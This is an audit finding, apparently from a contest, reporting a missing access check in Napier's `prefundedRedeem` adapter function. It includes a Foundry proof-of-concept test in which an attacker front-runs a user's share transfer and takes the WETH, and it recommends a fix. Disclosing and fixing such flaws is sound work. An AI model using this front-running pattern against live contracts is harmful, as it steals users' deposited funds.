# Shares could be lost and assets stolen with prefunded redemptions to children of `BaseLSTAdapter`

## Summary
Transfers of target token (adapter shares) to `BaseLSTAdapter`'s child contracts (`StEtherAdapter`, `SFrxETHAdapter`) could be lost and underlying assets could be stolen by an arbitrary sender who invokes the `prefundedRedeem` function.

## Vulnerability Detail
The design of the `prefundedRedeem` function implies that the caller should first transfer some amount of the target token (shares) and after that call the `prefundedRedeem` function within the same transaction, similarly to how it is done in the `Tranche` contract:

* https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/Tranche.sol#L283-L284
* https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/Tranche.sol#L313-L314
* https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/Tranche.sol#L345-L346
* https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/Tranche.sol#L422-L423

However if the `prefundedRedeem` function is not invoked within the same transaction, it could be either called by another user or frontrun by an attacker. This way the attacker will steal the underlying assets in the adapter contract, as there aren't any redemption ownership checks or accounting present in the `prefundedRedeem` function.

## Impact
Users could lose their shares in the adapter and not receive their underlying assets (WETH) in return.

## PoC

Add the following test in the `napier-v1/test/unit/adapters/BaseTestLSTAdapter.t.sol` test and run it by using:

```bash
forge test -vvv --match-test testPrefundedRedeem_WhenUserDepositsSharesInSeparateTransaction_ThenUserGetsFrontrunByAttackerAndLosesFunds
```

```solidity
    function testPrefundedRedeem_WhenUserDepositsSharesInSeparateTransaction_ThenUserGetsFrontrunByAttackerAndLosesFunds()
        public
        virtual
    {
        // GIVEN
        _storeBufferEth(1 ether);

        deal(address(target), address(user), 1 ether, true);
        assertEq(target.balanceOf(address(user)), 1 ether);

        address attacker = makeAddr("attacker");
        assertEq(target.balanceOf(address(attacker)), 0);

        // WHEN
        vm.startPrank(user);
        target.transfer(address(adapter), 1 ether);
        vm.stopPrank();

        assertEq(target.balanceOf(address(user)), 0);
        assertEq(target.balanceOf(address(adapter)), 1 ether);

        // THEN
        vm.startPrank(attacker);
        // The user's call to adapter's `prefundedRedeem` function is actually frontrun by an attacker
        (uint256 wethWithdrawn, uint256 sharesRedeemed) = adapter.prefundedRedeem(attacker);
        vm.stopPrank();

        assertEq(sharesRedeemed, 1 ether);
        assertEq(wethWithdrawn, underlying.balanceOf(attacker));
        assertTrue(wethWithdrawn > 0);
        assertEq(underlying.balanceOf(user), 0); // User doesn't receive any WETH and thus loses deposited assets.
    }
```

## Tool used

Manual Review

## Recommendation
If the `BaseLSTAdapter` and its children (`StEtherAdapter`, `SFrxETHAdapter`) is indeed expected to be used only by the `Tranche` contract, make the `prefundedRedeem` callable only by the `Tranche` contract via a modifier e.g.:

```solidity
    function prefundedRedeem(address recipient) external virtual onlyTranche returns (uint256, uint256) {
```
